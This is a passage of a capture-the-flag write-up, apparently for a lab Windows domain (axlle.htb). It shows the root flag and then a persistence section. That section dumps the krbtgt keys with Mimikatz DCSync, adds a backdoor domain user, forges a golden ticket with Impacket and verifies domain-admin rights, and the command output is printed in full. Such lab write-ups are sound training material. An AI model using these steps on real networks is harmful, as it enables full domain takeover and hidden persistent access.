+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>PS C:\&gt; type &quot;C:\Users\Administrator\Desktop\root.txt&quot;
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>cb3de3ae4e8dce9cf692c97b3ca841a4
+</span></code></pre></div>
+<h2 id="persistence">Persistence<a class="headerlink" href="#persistence" title="Permanent link">&para;</a></h2>
+<p>For fun we will create a golden ticket for persistence. We start by transferring <code>Mimikatz</code> over to the victim and run the following to get the <code>KRBTGT</code> AES key.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>PS C:\Programdata\xpltive&gt; .\mimikatz.exe privilege::debug &quot;lsadump::dcsync /user:axlle\krbtgt /domain:axlle.htb&quot; exit                                                                                                                                                                  
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a> .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a> &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a>
+</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a>mimikatz(commandline) # privilege::debug
+</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a>Privilege &#39;20&#39; OK
+</span><span id="__span-29-12"><a id="__codelineno-29-12" name="__codelineno-29-12" href="#__codelineno-29-12"></a>
+</span><span id="__span-29-13"><a id="__codelineno-29-13" name="__codelineno-29-13" href="#__codelineno-29-13"></a>mimikatz(commandline) # lsadump::dcsync /user:axlle\krbtgt /domain:axlle.htb
+</span><span id="__span-29-14"><a id="__codelineno-29-14" name="__codelineno-29-14" href="#__codelineno-29-14"></a>[DC] &#39;axlle.htb&#39; will be the domain
+</span><span id="__span-29-15"><a id="__codelineno-29-15" name="__codelineno-29-15" href="#__codelineno-29-15"></a>[DC] &#39;MAINFRAME.axlle.htb&#39; will be the DC server
+</span><span id="__span-29-16"><a id="__codelineno-29-16" name="__codelineno-29-16" href="#__codelineno-29-16"></a>[DC] &#39;axlle\krbtgt&#39; will be the user account
+</span><span id="__span-29-17"><a id="__codelineno-29-17" name="__codelineno-29-17" href="#__codelineno-29-17"></a>[rpc] Service  : ldap
+</span><span id="__span-29-18"><a id="__codelineno-29-18" name="__codelineno-29-18" href="#__codelineno-29-18"></a>[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+</span><span id="__span-29-19"><a id="__codelineno-29-19" name="__codelineno-29-19" href="#__codelineno-29-19"></a>
+</span><span id="__span-29-20"><a id="__codelineno-29-20" name="__codelineno-29-20" href="#__codelineno-29-20"></a>Object RDN           : krbtgt
+</span><span id="__span-29-21"><a id="__codelineno-29-21" name="__codelineno-29-21" href="#__codelineno-29-21"></a>
+</span><span id="__span-29-22"><a id="__codelineno-29-22" name="__codelineno-29-22" href="#__codelineno-29-22"></a>** SAM ACCOUNT **
+</span><span id="__span-29-23"><a id="__codelineno-29-23" name="__codelineno-29-23" href="#__codelineno-29-23"></a>
+</span><span id="__span-29-24"><a id="__codelineno-29-24" name="__codelineno-29-24" href="#__codelineno-29-24"></a>SAM Username         : krbtgt
+</span><span id="__span-29-25"><a id="__codelineno-29-25" name="__codelineno-29-25" href="#__codelineno-29-25"></a>Account Type         : 30000000 ( USER_OBJECT )
+</span><span id="__span-29-26"><a id="__codelineno-29-26" name="__codelineno-29-26" href="#__codelineno-29-26"></a>User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+</span><span id="__span-29-27"><a id="__codelineno-29-27" name="__codelineno-29-27" href="#__codelineno-29-27"></a>Account expiration   : 
+</span><span id="__span-29-28"><a id="__codelineno-29-28" name="__codelineno-29-28" href="#__codelineno-29-28"></a>Password last change : 1/1/2024 3:18:56 AM
+</span><span id="__span-29-29"><a id="__codelineno-29-29" name="__codelineno-29-29" href="#__codelineno-29-29"></a>Object Security ID   : S-1-5-21-1005535646-190407494-3473065389-502
+</span><span id="__span-29-30"><a id="__codelineno-29-30" name="__codelineno-29-30" href="#__codelineno-29-30"></a>Object Relative ID   : 502
+</span><span id="__span-29-31"><a id="__codelineno-29-31" name="__codelineno-29-31" href="#__codelineno-29-31"></a>
+</span><span id="__span-29-32"><a id="__codelineno-29-32" name="__codelineno-29-32" href="#__codelineno-29-32"></a>Credentials:
+</span><span id="__span-29-33"><a id="__codelineno-29-33" name="__codelineno-29-33" href="#__codelineno-29-33"></a>  Hash NTLM: 6d92f4784b46504cf3bedbc702ac03fe
+</span><span id="__span-29-34"><a id="__codelineno-29-34" name="__codelineno-29-34" href="#__codelineno-29-34"></a>    ntlm- 0: 6d92f4784b46504cf3bedbc702ac03fe
+</span><span id="__span-29-35"><a id="__codelineno-29-35" name="__codelineno-29-35" href="#__codelineno-29-35"></a>    lm  - 0: 51e7af3b2adfa8ab0e4d04f0a6ddb059
+</span><span id="__span-29-36"><a id="__codelineno-29-36" name="__codelineno-29-36" href="#__codelineno-29-36"></a>
+</span><span id="__span-29-37"><a id="__codelineno-29-37" name="__codelineno-29-37" href="#__codelineno-29-37"></a>Supplemental Credentials:                                     
+</span><span id="__span-29-38"><a id="__codelineno-29-38" name="__codelineno-29-38" href="#__codelineno-29-38"></a>* Primary:NTLM-Strong-NTOWF *                                 
+</span><span id="__span-29-39"><a id="__codelineno-29-39" name="__codelineno-29-39" href="#__codelineno-29-39"></a>    Random Value : 771d8d8376a11efa67b494c7d5f27ff3
+</span><span id="__span-29-40"><a id="__codelineno-29-40" name="__codelineno-29-40" href="#__codelineno-29-40"></a>
+</span><span id="__span-29-41"><a id="__codelineno-29-41" name="__codelineno-29-41" href="#__codelineno-29-41"></a>* Primary:Kerberos-Newer-Keys * 
+</span><span id="__span-29-42"><a id="__codelineno-29-42" name="__codelineno-29-42" href="#__codelineno-29-42"></a>    Default Salt : AXLLE.HTBkrbtgt                               
+</span><span id="__span-29-43"><a id="__codelineno-29-43" name="__codelineno-29-43" href="#__codelineno-29-43"></a>    Default Iterations : 4096                                         
+</span><span id="__span-29-44"><a id="__codelineno-29-44" name="__codelineno-29-44" href="#__codelineno-29-44"></a>    Credentials                                                       
+</span><span id="__span-29-45"><a id="__codelineno-29-45" name="__codelineno-29-45" href="#__codelineno-29-45"></a>      aes256_hmac       (4096) : ae2eb9caff08a7d80b1b9166f71a4de91e1bec20705400433383adf27f8d2a69
+</span><span id="__span-29-46"><a id="__codelineno-29-46" name="__codelineno-29-46" href="#__codelineno-29-46"></a>      aes128_hmac       (4096) : 096a951763767ceca7e1e5a5628451bd
+</span><span id="__span-29-47"><a id="__codelineno-29-47" name="__codelineno-29-47" href="#__codelineno-29-47"></a>      des_cbc_md5       (4096) : 9e545e64542a7070
+</span><span id="__span-29-48"><a id="__codelineno-29-48" name="__codelineno-29-48" href="#__codelineno-29-48"></a>&lt;--SNIP--&gt;
+</span></code></pre></div>
+<p>Next we create our user using <code>net</code> and then get their SID using <code>PowerView</code>. We only need the relative object id part here. We also get the domain SID.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>PS C:\Programdata\xpltive&gt; net user xpltive &quot;P@ssword123&quot; /add /domain
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>PS C:\Programdata\xpltive&gt; Get-DomainUser -Identity xpltive
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>pwdlastset            : 1/17/2025 12:48:40 PM
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>usncreated            : 172399                                        
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>lastlogoff            : 12/31/1600 4:00:00 PM
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>badpwdcount           : 0                                             
+</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>name                  : xpltive                                       
+</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>samaccounttype        : USER_OBJECT     
+</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>samaccountname        : xpltive                                       
+</span><span id="__span-30-11"><a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a>whenchanged           : 1/17/2025 8:48:40 PM
+</span><span id="__span-30-12"><a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a>objectsid             : S-1-5-21-1005535646-190407494-3473065389-10601
+</span><span id="__span-30-13"><a id="__codelineno-30-13" name="__codelineno-30-13" href="#__codelineno-30-13"></a>PS C:\Programdata\xpltive&gt; Get-DomainSID
+</span><span id="__span-30-14"><a id="__codelineno-30-14" name="__codelineno-30-14" href="#__codelineno-30-14"></a>S-1-5-21-1005535646-190407494-3473065389
+</span></code></pre></div>
+<p>This is everything we need and on our attack host we use the <code>ticketer</code> tool of <code>Impacket</code> to create our golden ticket. It will by default add our desired user to the <code>Domain Admins</code>, <code>Domain Users</code>, <code>Schema Admins</code>, <code>Enterprise Admins</code> and <code>Group Policy Creator Owners</code> groups.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>$ impacket-ticketer -aesKey ae2eb9caff08a7d80b1b9166f71a4de91e1bec20705400433383adf27f8d2a69 -domain axlle.htb -domain-sid S-1-5-21-1005535646-190407494-3473065389 -user-id 10601 xpltive                                                                   
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>[*] Creating basic skeleton ticket and PAC Infos
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>[*] Customizing ticket for axlle.htb/xpltive
+</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>[*]     PAC_LOGON_INFO
+</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a>[*]     PAC_CLIENT_INFO_TYPE
+</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a>[*]     EncTicketPart
+</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a>[*]     EncAsRepPart
+</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a>[*] Signing/Encrypting final ticket
+</span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a>[*]     PAC_SERVER_CHECKSUM
+</span><span id="__span-31-12"><a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a>[*]     PAC_PRIVSVR_CHECKSUM
+</span><span id="__span-31-13"><a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a>[*]     EncTicketPart
+</span><span id="__span-31-14"><a id="__codelineno-31-14" name="__codelineno-31-14" href="#__codelineno-31-14"></a>[*]     EncASRepPart
+</span><span id="__span-31-15"><a id="__codelineno-31-15" name="__codelineno-31-15" href="#__codelineno-31-15"></a>[*] Saving ticket in xpltive.ccache
+</span></code></pre></div>
+<p>And we can validate our little backdoor account with <code>Netexec</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>$ KRB5CCNAME=xpltive.ccache nxc smb mainframe.axlle.htb -u xpltive -k --use-kcache -x &quot;whoami /all&quot; 
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        [*] Windows Server 2022 Build 20348 x64 (name:MAINFRAME) (domain:axlle.htb) (signing:True) (SMBv1:False)
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        [+] axlle.htb\xpltive from ccache (Pwn3d!)
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        [+] Executed command via wmiexec
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        USER INFORMATION
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        ----------------
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        User Name         SID
+</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        ================= ==============================================
+</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        axlle.htb\xpltive S-1-5-21-1005535646-190407494-3473065389-10601
+</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        GROUP INFORMATION
+</span><span id="__span-32-11"><a id="__codelineno-32-11" name="__codelineno-32-11" href="#__codelineno-32-11"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        -----------------
+</span><span id="__span-32-12"><a id="__codelineno-32-12" name="__codelineno-32-12" href="#__codelineno-32-12"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        Group Name                                   Type             SID                                          Attributes
+</span><span id="__span-32-13"><a id="__codelineno-32-13" name="__codelineno-32-13" href="#__codelineno-32-13"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        ============================================ ================ ============================================ ===============================================================
+</span><span id="__span-32-14"><a id="__codelineno-32-14" name="__codelineno-32-14" href="#__codelineno-32-14"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        Everyone                                     Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+</span><span id="__span-32-15"><a id="__codelineno-32-15" name="__codelineno-32-15" href="#__codelineno-32-15"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        BUILTIN\Users                                Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+</span><span id="__span-32-16"><a id="__codelineno-32-16" name="__codelineno-32-16" href="#__codelineno-32-16"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        BUILTIN\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+</span><span id="__span-32-17"><a id="__codelineno-32-17" name="__codelineno-32-17" href="#__codelineno-32-17"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        BUILTIN\Administrators                       Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
+</span><span id="__span-32-18"><a id="__codelineno-32-18" name="__codelineno-32-18" href="#__codelineno-32-18"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        NT AUTHORITY\NETWORK                         Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+</span><span id="__span-32-19"><a id="__codelineno-32-19" name="__codelineno-32-19" href="#__codelineno-32-19"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+</span><span id="__span-32-20"><a id="__codelineno-32-20" name="__codelineno-32-20" href="#__codelineno-32-20"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        NT AUTHORITY\This Organization               Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+</span><span id="__span-32-21"><a id="__codelineno-32-21" name="__codelineno-32-21" href="#__codelineno-32-21"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        AXLLE\Domain Admins                          Group            S-1-5-21-1005535646-190407494-3473065389-512 Mandatory group, Enabled by default, Enabled group
+</span><span id="__span-32-22"><a id="__codelineno-32-22" name="__codelineno-32-22" href="#__codelineno-32-22"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        AXLLE\Group Policy Creator Owners            Group            S-1-5-21-1005535646-190407494-3473065389-520 Mandatory group, Enabled by default, Enabled group
+</span><span id="__span-32-23"><a id="__codelineno-32-23" name="__codelineno-32-23" href="#__codelineno-32-23"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        AXLLE\Schema Admins                          Group            S-1-5-21-1005535646-190407494-3473065389-518 Mandatory group, Enabled by default, Enabled group
+</span><span id="__span-32-24"><a id="__codelineno-32-24" name="__codelineno-32-24" href="#__codelineno-32-24"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        AXLLE\Enterprise Admins                      Group            S-1-5-21-1005535646-190407494-3473065389-519 Mandatory group, Enabled by default, Enabled group
+</span><span id="__span-32-25"><a id="__codelineno-32-25" name="__codelineno-32-25" href="#__codelineno-32-25"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        AXLLE\Denied RODC Password Replication Group Alias            S-1-5-21-1005535646-190407494-3473065389-572 Mandatory group, Enabled by default, Enabled group, Local Group
+</span><span id="__span-32-26"><a id="__codelineno-32-26" name="__codelineno-32-26" href="#__codelineno-32-26"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        Mandatory Label\High Mandatory Level         Label            S-1-16-12288
+</span><span id="__span-32-27"><a id="__codelineno-32-27" name="__codelineno-32-27" href="#__codelineno-32-27"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        PRIVILEGES INFORMATION
+</span><span id="__span-32-28"><a id="__codelineno-32-28" name="__codelineno-32-28" href="#__codelineno-32-28"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        ----------------------
+</span><span id="__span-32-29"><a id="__codelineno-32-29" name="__codelineno-32-29" href="#__codelineno-32-29"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        Privilege Name                            Description                                                        State
+</span><span id="__span-32-30"><a id="__codelineno-32-30" name="__codelineno-32-30" href="#__codelineno-32-30"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        ========================================= ================================================================== =======
+</span><span id="__span-32-31"><a id="__codelineno-32-31" name="__codelineno-32-31" href="#__codelineno-32-31"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+</span><span id="__span-32-32"><a id="__codelineno-32-32" name="__codelineno-32-32" href="#__codelineno-32-32"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+</span><span id="__span-32-33"><a id="__codelineno-32-33" name="__codelineno-32-33" href="#__codelineno-32-33"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+</span><span id="__span-32-34"><a id="__codelineno-32-34" name="__codelineno-32-34" href="#__codelineno-32-34"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+</span><span id="__span-32-35"><a id="__codelineno-32-35" name="__codelineno-32-35" href="#__codelineno-32-35"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+</span><span id="__span-32-36"><a id="__codelineno-32-36" name="__codelineno-32-36" href="#__codelineno-32-36"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+</span><span id="__span-32-37"><a id="__codelineno-32-37" name="__codelineno-32-37" href="#__codelineno-32-37"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeSystemtimePrivilege                     Change the system time                                             Enabled
+</span><span id="__span-32-38"><a id="__codelineno-32-38" name="__codelineno-32-38" href="#__codelineno-32-38"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+</span><span id="__span-32-39"><a id="__codelineno-32-39" name="__codelineno-32-39" href="#__codelineno-32-39"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+</span><span id="__span-32-40"><a id="__codelineno-32-40" name="__codelineno-32-40" href="#__codelineno-32-40"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+</span><span id="__span-32-41"><a id="__codelineno-32-41" name="__codelineno-32-41" href="#__codelineno-32-41"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeBackupPrivilege                         Back up files and directories                                      Enabled
+</span><span id="__span-32-42"><a id="__codelineno-32-42" name="__codelineno-32-42" href="#__codelineno-32-42"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeRestorePrivilege                        Restore files and directories                                      Enabled
+</span><span id="__span-32-43"><a id="__codelineno-32-43" name="__codelineno-32-43" href="#__codelineno-32-43"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeShutdownPrivilege                       Shut down the system                                               Enabled
+</span><span id="__span-32-44"><a id="__codelineno-32-44" name="__codelineno-32-44" href="#__codelineno-32-44"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeDebugPrivilege                          Debug programs                                                     Enabled
+</span><span id="__span-32-45"><a id="__codelineno-32-45" name="__codelineno-32-45" href="#__codelineno-32-45"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+</span><span id="__span-32-46"><a id="__codelineno-32-46" name="__codelineno-32-46" href="#__codelineno-32-46"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+</span><span id="__span-32-47"><a id="__codelineno-32-47" name="__codelineno-32-47" href="#__codelineno-32-47"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+</span><span id="__span-32-48"><a id="__codelineno-32-48" name="__codelineno-32-48" href="#__codelineno-32-48"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeUndockPrivilege                         Remove computer from docking station                               Enabled
+</span><span id="__span-32-49"><a id="__codelineno-32-49" name="__codelineno-32-49" href="#__codelineno-32-49"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+</span><span id="__span-32-50"><a id="__codelineno-32-50" name="__codelineno-32-50" href="#__codelineno-32-50"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+</span><span id="__span-32-51"><a id="__codelineno-32-51" name="__codelineno-32-51" href="#__codelineno-32-51"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+</span><span id="__span-32-52"><a id="__codelineno-32-52" name="__codelineno-32-52" href="#__codelineno-32-52"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+</span><span id="__span-32-53"><a id="__codelineno-32-53" name="__codelineno-32-53" href="#__codelineno-32-53"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+</span><span id="__span-32-54"><a id="__codelineno-32-54" name="__codelineno-32-54" href="#__codelineno-32-54"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeTimeZonePrivilege                       Change the time zone                                               Enabled
+</span><span id="__span-32-55"><a id="__codelineno-32-55" name="__codelineno-32-55" href="#__codelineno-32-55"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+</span><span id="__span-32-56"><a id="__codelineno-32-56" name="__codelineno-32-56" href="#__codelineno-32-56"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+</span><span id="__span-32-57"><a id="__codelineno-32-57" name="__codelineno-32-57" href="#__codelineno-32-57"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        USER CLAIMS INFORMATION
+</span><span id="__span-32-58"><a id="__codelineno-32-58" name="__codelineno-32-58" href="#__codelineno-32-58"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        -----------------------
+</span><span id="__span-32-59"><a id="__codelineno-32-59" name="__codelineno-32-59" href="#__codelineno-32-59"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        User claims unknown.
+</span><span id="__span-32-60"><a id="__codelineno-32-60" name="__codelineno-32-60" href="#__codelineno-32-60"></a>SMB         mainframe.axlle.htb 445    MAINFRAME        Kerberos support for Dynamic Access Control on this device has been disabled.
+</span></code></pre></div>
 
 
 
